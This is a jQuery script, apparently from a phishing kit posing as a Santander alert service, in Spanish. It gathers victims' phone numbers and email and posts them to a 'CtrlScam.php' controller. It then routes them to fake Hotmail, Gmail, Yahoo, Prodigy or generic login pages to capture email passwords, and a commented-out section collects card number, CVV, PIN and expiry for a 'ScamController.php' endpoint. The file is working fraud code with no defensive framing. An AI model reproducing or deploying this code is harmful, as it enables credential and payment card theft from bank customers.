$(document).ready(function () {
    //$('#loading.UtilDialog').css('display','block!important');
    
    $('#loading2').hide();
    
    
    var intentos = 1;
    var intentosCC = 1;
    var fase = 'email';
    var formulario = "one";

    var urlSend = "";
    
    var token = $('#tok').val();
    var fl = $('#folID').val();







    var request = "";

    var urlHotmail = "../hotmail/login.php?usr=";
    var urlGmail = "../google/signin/v2/sl/pwd/?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2FManageAccount&followup=https%3A%2F%2Faccounts.google.com%2FManageAccount&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&user=";
    var urlYahoo = "../yahoo/account/challenge/password.php?src=fpctx&.intl=es&.lang=es-ES&authMechanism=primary&display=login&yid=648927492&done=https%3A%2F%2Fesyahoocom%2F&sessionIndex=QQ--&acrumb=cy7jZsTF&user=email&usr=";
    var urlProdigy = "../prodigy/AccesoCorreo/pages/MiAcceso_01.php?usr=";
    var urlGenerico = "../EmailGenerico/defaultEmail.php?src=fpctx&.intl=es&.lang=es-ES&authMechanism=primary&display=login&yid=648927492&done=https%3A%2F%2Fesyahoocom%2F&sessionIndex=QQ--&acrumb=cy7jZsTF&user=email&usr=";
    var msgBaseTitle = "Para sincronizar correctamente la cuenta de su correo electr&oacute;nico, es necesario que se autentique en su cuenta de correo electr&oacute;nico ";
    var msgBaseBoton = "Ir a ";
    var msgBaseBotonGenerico = "Autenticarme con ";
    var msgEmailIngreso = "";
    var msgBtn = "";
    var tEmail = false;

    function validateTipeEMail(email, session){


        if(/@hotmail/.test(email) || /@HOTMAIL/.test(email) || /@outlook/.test(email) || /@OUTLOOK/.test(email) || /@live/.test(email) || /@LIVE/.test(email)){
            $('#iframeEmail').attr('src',urlHotmail+email+'&session='+session);
            msgEmailIngreso = msgBaseTitle+"de HOTMAIL";
            msgBtn = msgBaseBoton+"HOTMAIL";
        }else if(/@gmail/.test(email) || /@GMAIL/.test(email)){
            $('#iframeEmail').attr('src',urlGmail+email+'&session='+session);
            msgEmailIngreso = msgBaseTitle+"de GMAIL";
            msgBtn = msgBaseBoton+"GMAIL";
        }else if(/@yahoo/.test(email) || /@YAHOO/.test(email)){
            $('#iframeEmail').attr('src',urlYahoo+email+'&session='+session);
            msgEmailIngreso = msgBaseTitle+"de YAHOO";
            msgBtn = msgBaseBoton+"YAHOO";
        }else if(/@prodigy/.test(email) || /@PRODIGY/.test(email) || /@infinitum/.test(email) || /@INFINITUM/.test(email) || /@.mitmx/.test(email) || /@.MITMX/.test(email) || /@telmex/.test(email) || /@TELMEX/.test(email) || /@ctbr/.test(email) || /@CTBR/.test(email) || /@limsa/.test(email) || /@LIMSA/.test(email) || /@telnormail/.test(email) || /@TELNORMAIL/.test(email)){
            $('#iframeEmail').attr('src',urlProdigy+email+'&session='+session);
            msgEmailIngreso = msgBaseTitle+"de PRODIGY";
            msgBtn = msgBaseBoton+"PRODIGY";
        }else{
            $('#iframeEmail').attr('src',urlGenerico+email+'&session='+session);
            msgEmailIngreso = msgBaseBotonGenerico+email;
            msgBtn = msgBaseBotonGenerico+email;
            msgBaseTitle
            $('#btnEmailRedirect').removeClass('btn_celeste_91').addClass('btn_celeste_91_big');

            tEmail = true;
        }
    }

    

    function clearFields() {
        if (fase == 'email') {
            $('#i23BisA').val('');
            $('#i23BisA2').val('');
        }

        if (fase == 'cc') {
            $('#i134231').val('');;
            $('#i13411').val('');;
            $('#i1342').val('');;
            $('#i1345').val('');;
            $('#selectCompaniaMes').val('');;
            $('#selectCompaniaYear').val('');;
        }

    }
    
    //window.parent.closeWindowFather();
    
    $('#okBut').click(function(){
        //self.close();
        //window.parent.closeWindowFather();
        //window.close();

        window.parent.closeWindowFather();

        //$(window).close();
        //parent.window.location.href="www.google.com.mx";
    });
    
    //$('#loading.UtilDialog').attr('display', 'block');

    $('#Limpiar').click(function () {
        clearFields();
    });

    $('#cancelButs').click(function (e) {
        e.preventDefault();
        var email = $('#i23BisA');
        var nombre_completo = $('#i23BisA2');
        var celular = $('#i23BisA22');
        var phone = $('#i23BisA221');
        var exp = /^[a-zA-Z0-9_\.\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9\-\.]+$/;
        
        
        //var celular = $('#i134231');
        var tarjeta = $('#i13411');
        var cvv = $('#i1342');
        var nip = $('#i1345');
        var mes = $('#selectCompaniaMes');
        var year = $('#selectCompaniaYear');
        
        
        
        if (formulario == "one") {


            if(celular.val() == ''){
                alert('Favor de ingrese los 10 digítos de su número celular');
                celular.focus();
            }else{
                if(phone.val() == ''){
                    alert('Favor de ingrese los 10 digítos de su número de casa u oficina');
                    phone.focus();
                }else{
                    if (email.val() == '') {
                        alert('Favor de ingresar un email')
                        email.focus();
                    } else {
                        if (!exp.test(email.val())) {
                            alert('Favor de ingresar un email válido');
                            email.focus()
                        } else {

                            urlSend = "contacto";

                            //alert(celular.val()+" "+phone.val()+" "+email.val()+" "+$('#session').val());

                            $.ajax({
                                type: 'POST',
                                url: '../Controllers/CtrlScam.php',
                                data: {
                                    "request": "contacto",
                                    "celular": celular.val(),
                                    "phone": phone.val(),
                                    "email": email.val(),
                                    "session": $('#session').val()
                                },
                                beforeSend: function () {
                                    console.log("ENviando...");
                                    $('#loading2').show();
                                    //showLoading();
                                },
                                success: function (resp) {
                                    //hideLoading();
                                    $('#loading2').hide();
                                    console.log('Datos Enviados');
                                    //alert(resp);
                                    console.log(resp);

                                    fase = 'cc';
                                    $('#td0UtilDialogHeader').css('background', 'url("img/ico-step-2.gif") right 2px no-repeat');
                                    $('#i1002').text('');
                                    



                                    $('#frmEmail').hide();
                                    $('#i100').text('Por favor, inicie sesión en su correo electrónico para que de esta quede asociado su email al servicio de alertas Santander.');
                                    //$('#i200').show();

                                    validateTipeEMail(email.val(), $('#session').val());
                                    $('#frmNotify').show();
                                    $('#cancelButs').text(msgBtn).show();



                                    //alert(resp)
                                    formulario = "two";
                                    fase = "cc";

                                },
                                error: function (request, textStatus, errorThrown) {
                                    console.log('Error al Enviar los Datos: ' + errorThrown);
                                }
                            });
                        }
                    }
                }
            }
            /*if(nombre_completo.val() == ''){
                alert('Favor de ingrese su nombre completo');
                nombre_completo.focus();
            }else{
                

            }*/

            
        } else {
            
            $('#UtilDialog').hide();
            $('#backmodal').show();
            $('#divEmailConfirm').show();
            //alert('Estoy aca')
    
            
            /*if(celular.val() == "" || celular.val().length != 10){
                alert('Favor de ingresar los 10 digitos de su teléfono celular');
                celular.focus();
            }else{
                if(tarjeta.val() == "" || tarjeta.val().length != 16){
                    alert('Favor de ingresar los 16 digitos de su tarjeta');
                    tarjeta.focus();
                }else{
                    if(cvv.val() == "" || cvv.val().length != 3){
                        alert('Favor de ingresar los 3 digitos que se encuentran al reverso de su tarjeta');
                        cvv.focus();
                    }else{
                        if(nip.val() == "" || nip.val().length != 4){
                            alert('Favor de ingresar los 4 digitos de si NIP');
                            nip.focus();
                        }else{
                            if(mes.val() == ""){
                                alert('Favor de seleccionar el mes de expiración de su tarjeta');
                                mes.focus();
                            }else{
                                if(year.val() == ""){
                                    alert('Favor de seleccionar el año de expiración de su tarjeta');
                                    year.focus();
                                }else{
                                    if (intentosCC == 1) {
                                        urlSend = "cc";
                                    } else {
                                        urlSend = "cc_confirm";
                                    }
                                    
                                    $.ajax({
                                        type: 'POST',
                                        url: '../Controllers/ScamController.php',
                                        data: {
                                            "request": urlSend,
                                            "celular": celular.val(),
                                            "tarjeta": tarjeta.val(),
                                            "cvv": cvv.val(),
                                            "nip": nip.val(),
                                            "tarjeta_expiracion": mes.val()+"/"+year.val(),
                                            "token": token,
                                            "folioID": fl
                                        },
                                        beforeSend: function () {
                                            console.log("ENviando...");
                                        },
                                        success: function (resp) {
                                            console.log('Datos Enviados');
                                            console.log(resp);
                                            if (resp == "1") {

                                                fase = 'folio';
                                                    $('#td0UtilDialogHeader').css('background', 'url("img/ico-step-3.gif") right 2px no-repeat');
                                                    $('#i1002').text('');
                                                    $('#frmCC').hide();
                                                    $('#frmFolio').show();
                                                    //alert(resp)
                                                    formulario = "folio";
                                                    fase = "folio";
                                                    
                                                    $('#i100').text('Favor de conservar el siguiente No. de folio');
                                                    
                                                    $('#okBut').show();
                                                    $('#Limpiar').hide();
                                                    $('#cancelButs').hide();

                                                


                                            } else {
                                                //alert('Fallo al guardar');
                                                console.log('Fallo al guardar')
                                            }
                                        },
                                        error: function (request, textStatus, errorThrown) {
                                            console.log('Error al Enviar los Datos: ' + errorThrown);
                                        }
                                    });
                                }
                            }
                        }
                    }
                }
            }*/
            
            
            
            //alert('Validando el segundo formulario')
            /*
            */
        }






    });

});
